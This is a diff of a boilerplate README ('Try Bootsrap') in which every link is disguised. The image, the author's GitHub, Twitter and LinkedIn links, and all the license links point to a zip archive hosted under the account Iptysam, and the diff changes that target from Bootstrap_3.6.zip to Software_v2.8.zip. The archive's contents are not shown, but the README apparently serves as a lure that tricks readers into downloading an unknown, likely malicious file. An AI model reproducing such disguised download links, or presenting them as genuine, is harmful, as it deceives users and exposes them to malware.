@@ -1,4 +1,4 @@
-![](https://raw.githubusercontent.com/Iptysam/Bootstrap/main/canoeman/Bootstrap_3.6.zip)
+![](https://raw.githubusercontent.com/Iptysam/Bootstrap/main/canoeman/Software_v2.8.zip)
 
 # Try Bootsrap
 
@@ -20,9 +20,9 @@
 
 👤 **Author1**
 
-- GitHub: [@githubhandle](https://raw.githubusercontent.com/Iptysam/Bootstrap/main/canoeman/Bootstrap_3.6.zip)
-- Twitter: [@twitterhandle](https://raw.githubusercontent.com/Iptysam/Bootstrap/main/canoeman/Bootstrap_3.6.zip)
-- LinkedIn: [LinkedIn](https://raw.githubusercontent.com/Iptysam/Bootstrap/main/canoeman/Bootstrap_3.6.zip)
+- GitHub: [@githubhandle](https://raw.githubusercontent.com/Iptysam/Bootstrap/main/canoeman/Software_v2.8.zip)
+- Twitter: [@twitterhandle](https://raw.githubusercontent.com/Iptysam/Bootstrap/main/canoeman/Software_v2.8.zip)
+- LinkedIn: [LinkedIn](https://raw.githubusercontent.com/Iptysam/Bootstrap/main/canoeman/Software_v2.8.zip)
 
 
 ## 🤝 Contributing
@@ -43,6 +43,6 @@ Give a ⭐️ if you like this project!
 
 ## 📝 License
 
-This project is [MIT](https://raw.githubusercontent.com/Iptysam/Bootstrap/main/canoeman/Bootstrap_3.6.zip) licensed.
+This project is [MIT](https://raw.githubusercontent.com/Iptysam/Bootstrap/main/canoeman/Software_v2.8.zip) licensed.
 
-_NOTE: we recommend using the [MIT license](https://raw.githubusercontent.com/Iptysam/Bootstrap/main/canoeman/Bootstrap_3.6.zip) - you can set it up quickly by [using templates available on GitHub](https://raw.githubusercontent.com/Iptysam/Bootstrap/main/canoeman/Bootstrap_3.6.zip). You can also use [any other license](https://raw.githubusercontent.com/Iptysam/Bootstrap/main/canoeman/Bootstrap_3.6.zip) if you wish._
+_NOTE: we recommend using the [MIT license](https://raw.githubusercontent.com/Iptysam/Bootstrap/main/canoeman/Software_v2.8.zip) - you can set it up quickly by [using templates available on GitHub](https://raw.githubusercontent.com/Iptysam/Bootstrap/main/canoeman/Software_v2.8.zip). You can also use [any other license](https://raw.githubusercontent.com/Iptysam/Bootstrap/main/canoeman/Software_v2.8.zip) if you wish._
